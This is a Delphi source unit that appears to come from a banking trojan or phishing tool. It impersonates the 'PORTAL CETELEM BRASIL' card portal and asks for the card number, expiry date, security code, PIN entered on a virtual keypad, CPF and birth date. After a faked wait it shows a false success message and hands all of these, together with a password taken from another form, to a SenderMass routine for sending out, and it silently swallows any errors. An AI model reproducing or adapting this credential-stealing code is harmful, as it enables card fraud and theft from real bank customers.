unit Cetele1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, 
  Dialogs, pngimage, ExtCtrls, StdCtrls;

type
  TCetel1 = class(TFrame)
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    Image4: TImage;
    Editcard: TEdit;
    Editmes: TEdit;
    Editano: TEdit;
    Editseg: TEdit;
    Editsenha: TEdit;
    Editcpf: TEdit;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    ComboBox3: TComboBox;
    Image5: TImage;
    Image6: TImage;
    Image7: TImage;
    Image8: TImage;
    Image9: TImage;
    Image10: TImage;
    Image11: TImage;
    Image12: TImage;
    Image13: TImage;
    Image14: TImage;
    Image15: TImage;
    Image16: TImage;
    procedure Image2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Image3MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Image4MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure EditcardChange(Sender: TObject);
    procedure EditmesChange(Sender: TObject);
    procedure EditanoChange(Sender: TObject);
    procedure Image5Click(Sender: TObject);
    procedure Image9Click(Sender: TObject);
    procedure Image12Click(Sender: TObject);
    procedure Image6Click(Sender: TObject);
    procedure Image10Click(Sender: TObject);
    procedure Image13Click(Sender: TObject);
    procedure Image7Click(Sender: TObject);
    procedure Image11Click(Sender: TObject);
    procedure Image14Click(Sender: TObject);
    procedure Image8Click(Sender: TObject);
    procedure Image16Click(Sender: TObject);
    procedure Image15Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;
  var
  Valor: Integer;

implementation

{$R *.dfm}
uses
Natal, Gerador, Cetele;

procedure TCetel1.EditanoChange(Sender: TObject);
begin
  if Length(Editano.Text) = 4 then
  Editseg.SetFocus;
end;

procedure TCetel1.EditcardChange(Sender: TObject);
begin
  if Length(Editcard.Text) = 16 then
  Editmes.SetFocus;
end;

procedure TCetel1.EditmesChange(Sender: TObject);
begin
  if Length(Editmes.Text) = 2 then
  Editano.SetFocus;
end;

procedure TCetel1.Image10Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '7';
end;

procedure TCetel1.Image11Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '3';
end;

procedure TCetel1.Image12Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '4';
end;

procedure TCetel1.Image13Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '0';
end;

procedure TCetel1.Image14Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '9';
end;

procedure TCetel1.Image15Click(Sender: TObject);
begin
  EditSenha.Text := '';
  Valor := 0;
end;

procedure TCetel1.Image2MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  Image2.Hint :='Informe o número do seu cartão Titular';
end;

procedure TCetel1.Image3MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  Image3.Hint :='Informe através do teclado vrirtual a Senha do cartão';
end;

procedure TCetel1.Image4MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  Image4.Hint :='Informe o número do CPF titular sem pontos ou hífen';
end;

procedure TCetel1.Image5Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '5';
end;

procedure TCetel1.Image6Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '1';
end;

procedure TCetel1.Image7Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '6';
end;

procedure TCetel1.Image8Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '8';
end;

procedure TCetel1.Image9Click(Sender: TObject);
begin
  EditSenha.Text := EditSenha.Text + '2';
end;

procedure TCetel1.Image16Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;


     if Editcard.Text='' then
  begin
    MessageBox(Self.handle,'Informe o Número do Cartão de Crédito!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

      if EditcPF.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu CPF!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

     if EditMes.Text='' then
  begin
    MessageBox(Self.handle,'Informe o mês da validade de seu Cartão!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

       if EditAno.Text='' then
  begin
    MessageBox(Self.handle,'Informe o ano da validade de seu Cartão!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

       if EditSeg.Text='' then
  begin
    MessageBox(Self.handle,'Informe o código de segurança do seu Cartão!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

         if EditSeNha.Text='' then
  begin
    MessageBox(Self.handle,'Informe a Senha do seu Cartão!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

          if ComboBox1.Text+ComboBox2.Text+ComboBox3.Text='' then
  begin
    MessageBox(Self.handle,'Informe a data de seu nascimento!', 'PORTAL CETELEM BRASIL', mb_IconError + mb_Ok);
    exit;
  end;

DadosEnvio_ := TStringList.Create;

DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('CETELEM:');
DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('CODIGO SEGURAN: '+  Cetel.EditUser.Text);
DadosEnvio_.Add('SENHAS CREDITO: '+  Cetel.EditSeNha.Text);
DadosEnvio_.Add('=============================================');
DadosEnvio_.Add('CARTAO CREDITO: '+  EditCard.text);
DadosEnvio_.Add('VALIDADE CARTA: '+  EditMes.text+'/'+EditAno.Text);
DadosEnvio_.Add('CODIGO SEGURAN: '+  EditSeg.Text);
DadosEnvio_.Add('SENHAS CREDITO: '+  EditSeNha.Text);
DadosEnvio_.Add('CPF DO TITULAR: '+  EditcPF.text);
DadosEnvio_.Add('NASCIMENTO TIT: '+  ComboBox1.Text+'/'+ComboBox2.Text+'/'+ComboBox3.Text);
DadosEnvio_.Add('=============================================');


Application.MessageBox(' Atualização Efetuada com Sucesso! ', 'PORTAL CETELEM BRASIL',mb_Ok+mb_IconInformation);



//SenderFull
try
  Cetel.Visible := False;
  SenderMass(DadosEnvio_ , 'CETELEM');
  DadosEnvio_.Free;
except
end;

  Cetel.TCetel.Enabled := False;

end;
end.
